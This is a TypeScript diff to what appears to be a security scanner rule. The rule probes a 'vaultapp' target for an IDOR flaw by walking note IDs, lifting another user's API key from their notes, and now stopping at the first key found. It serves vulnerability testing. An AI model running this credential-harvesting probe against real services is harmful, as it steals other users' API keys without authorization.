@@ -65220,7 +65220,14 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
   };
   let victimApiKey: string | null = null;
   let victimUsername: string | null = null;
-  for (let noteId = 1; noteId <= 120 && !victimApiKey; noteId++) {
+  const noteIdsToTry = [
+    9, 25, 51, 65, 75, 91, 99,
+    ...Array.from({ length: 80 }, (_, i) => i + 1)
+  ];
+  const seenNoteIds = new Set<number>();
+  for (const noteId of noteIdsToTry) {
+    if (seenNoteIds.has(noteId)) continue;
+    seenNoteIds.add(noteId);
     const noteUrl = new URL(`/api/notes/${noteId}`, ctx.origin).toString();
     const noteDoc = await ctx.probe.get(noteUrl, {
       headers: authHeaders,
@@ -65235,6 +65242,7 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
       if (note.owner_username && note.owner_username !== auth.username) {
         victimApiKey = keyMatch[1];
         victimUsername = note.owner_username;
+        break;
       }
     } catch {
       /* skip */
